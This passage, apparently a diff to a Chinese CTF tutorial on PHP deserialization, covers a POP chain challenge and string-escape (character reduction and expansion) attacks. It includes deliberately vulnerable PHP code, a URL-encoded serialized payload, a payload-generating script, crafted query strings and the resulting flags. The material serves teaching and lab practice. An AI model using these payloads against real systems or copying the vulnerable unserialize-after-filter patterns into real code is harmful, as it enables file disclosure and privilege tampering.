@@ -1135,4 +1135,263 @@ echo urlencode(serialize(new index()));
 win-1iljbo80gej\administrator
 ```
 
-### 3、
+### 3、POP 链构造及 POC 构造
+
+题目代码：
+
+```php
+<?php
+//flag is in flag.php
+highlight_file(__FILE__);
+error_reporting(0);
+class Modifier {
+    private $var;
+    public function append($value)
+    {
+        include($value);
+        echo $flag;
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __toString(){
+        return $this->str->source;
+    }
+    public function __wakeup(){
+        echo $this->source;
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+
+if(isset($_GET['pop'])){
+    unserialize($_GET['pop']);
+}
+?>
+```
+
+构造 payload：
+
+```text
+O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D
+```
+
+```php
+<?php
+class Modifier {
+    private $var = "flag.php";
+}
+
+class Show{
+    public $source;
+    public $str;
+}
+
+class Test{
+    public $p;
+}
+
+$show = new Show();
+$test = new Test();
+$modifier = new Modifier();
+$show->source = $show;
+$show->str = $test;
+$test->p = $modifier;
+
+
+echo urlencode(serialize($show));
+```
+
+运行结果：
+
+```text
+ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}
+```
+
+## 九、字符串逃逸
+
+### 1、前置知识
+
+反序列化分隔符：PHP 在反序列化时，语法是以 `;` 作为字段的分隔，以 `}` 作为结尾，在结束符 `}` 之后的任何内容不影响正常的反序列化
+
+内容判断：根据长度判断内容，`"` 属于字符还是格式符号，是由字符串长度 `4` 来判断的
+
+```text
+'O:6:"people":2:{s:4:"name";s:4:"Bo"b";s:3:"age";s:2:"20";}
+```
+
+**注意：成员属性数量、名称长度、内容长度一致**
+
+示例代码：
+
+```php
+<?php
+
+// 成员属性数量不对
+$b = 'O:1:"A":1:{s:2:"v1";s:1:"a";s:2:"v2";N;}';
+var_dump(unserialize($b));
+
+// 名称长度不对
+$b = 'O:1:"A":2:{s:22:"v1";s:1:"a";s:2:"v2";N;}';
+var_dump(unserialize($b));
+```
+
+运行结果：
+
+```text
+bool(false)
+bool(false)
+```
+
+示例代码：
+
+```php
+<?php
+
+class A{
+    public $v1 = "a";
+}
+
+echo serialize(new A());
+
+$a = 'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";N;}';
+var_dump(unserialize($a));
+```
+
+运行结果：
+
+```text
+O:1:"A":1:{s:2:"v1";s:1:"a";}
+object(A)#1 (2) {
+ ["v1"]=>
+ string(1) "a"
+ ["v2"]=>
+ NULL
+}
+```
+
+字符串逃逸：开发者先将对象序列化，然后将序列化后的敏感字符进行过滤或替换，最后再进行反序列化，这个时候就有可能会产生PHP反序列化字符逃逸的漏洞
+
+1. 字符串减少
+
+```text
+O:4:"user":1:{s:8:"username";s:5:"admin";} --> O:4:"user":1:{s:8:"username";s:5:"hack";}
+```
+
+2. 字符串增多
+
+```text
+O:4:"user":1:{s:8:"username";s:5:"admin";} --> O:4:"user":1:{s:8:"username";s:5:"hacker";}
+```
+
+### 2、字符串逃逸-减少
+
+示例代码：
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($name){
+    $safe=array("flag","php");
+    $name=str_replace($safe,"hk",$name);
+    return $name;
+}
+class test{
+    var $user;
+    var $pass;
+    var $vip = false ;
+    function __construct($user,$pass){
+        $this->user=$user;
+    $this->pass=$pass;
+    }
+}
+$param=$_GET['user'];
+$pass=$_GET['pass'];
+$param=serialize(new test($param,$pass));
+$profile=unserialize(filter($param));
+
+if ($profile->vip){
+    echo file_get_contents("flag.php");
+}
+?>
+```
+
+构造参数：`?user=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&pass=;s:4:"pass";N;s:3:"vip";b:1;}`
+
+运行结果：
+
+```text
+<!--?php
+
+/*
+ * # -*- coding: utf-8 -*-
+ * # @Author: benben
+ * # @link: https://ctfstu.com
+ *
+ * */
+
+$flag = 'ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}';
+-->
+```
+
+### 3、字符串逃逸-增多
+
+示例代码：
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($name){
+    $safe=array("flag","php");
+    $name=str_replace($safe,"hack",$name);
+    return $name;
+}
+class test{
+    var $user;
+    var $pass='daydream';
+    function __construct($user){
+        $this->user=$user;
+    }
+}
+$param=$_GET['param'];
+$param=serialize(new test($param));
+$profile=unserialize(filter($param));
+
+if ($profile->pass=='escaping'){
+    echo file_get_contents("flag.php");
+}
+?>
+```
+
+构造参数：`?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}`
+
+```text
+<!--?php
+
+/*
+ * # -*- coding: utf-8 -*-
+ * # @Author: benben
+ * # @link: https://ctfstu.com
+ *
+ * */
+
+$flag = 'ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}';
+-->
+```
